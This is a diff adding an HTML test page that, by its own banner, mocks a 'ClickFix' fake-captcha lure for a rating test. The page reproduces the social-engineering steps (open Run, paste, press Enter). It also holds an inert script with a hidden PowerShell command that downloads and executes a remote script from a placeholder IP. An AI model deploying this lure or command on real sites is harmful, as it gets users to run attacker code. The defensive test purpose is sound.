@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Verification Required - Confirm You Are Human</title>
+    <style>
+        body { margin: 0; background: #f6f7fb; color: #101828;
+               font: 16px/1.65 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; }
+        .banner { background: #1f2937; color: #fff; padding: 11px 16px; font-size: 14px; }
+        .card { width: min(560px, 100% - 40px); margin: 50px auto; background: #fff; padding: 26px;
+                border: 1px solid #e3e8ef; border-radius: 14px; }
+        h1 { font-size: 24px; margin: 0 0 6px; }
+        ol { line-height: 2; }
+        .check { display: flex; gap: 10px; align-items: center; border: 1px solid #d0d5dd;
+                 border-radius: 8px; padding: 14px; margin: 16px 0; }
+        .box { width: 22px; height: 22px; border: 2px solid #98a2b3; border-radius: 4px; }
+        kbd { background: #101828; color: #fff; border-radius: 4px; padding: 2px 7px; font-size: 13px; }
+    </style>
+</head>
+<body>
+<div class="banner">TEST PAGE - a mock "ClickFix" fake captcha. No command is copied or run. Expected rating: F.</div>
+
+<div class="card">
+    <h1>Verify you are human</h1>
+    <p>This site needs to confirm your browser before you continue.</p>
+
+    <div class="check"><span class="box"></span><span>I am not a robot</span></div>
+
+    <p>Verification failed automatically. Complete it manually:</p>
+    <ol>
+        <li>Press <kbd>Windows + R</kbd> to open the Run window</li>
+        <li>Press <kbd>Ctrl + V</kbd> to paste it into the box</li>
+        <li>Press Enter to verify</li>
+    </ol>
+    <p>Do not close this window while verification completes.</p>
+</div>
+
+<!-- Deliberately inert: type="text/plain" means the browser never runs this. -->
+<script type="text/plain" id="clickfix-code">
+    document.querySelector('.check').addEventListener('click', function () {
+        navigator.clipboard.writeText('powershell -w hidden -c "iwr http://203.0.113.10/v.txt|iex" # verify-id-8842');
+    });
+</script>
+</body>
+</html>
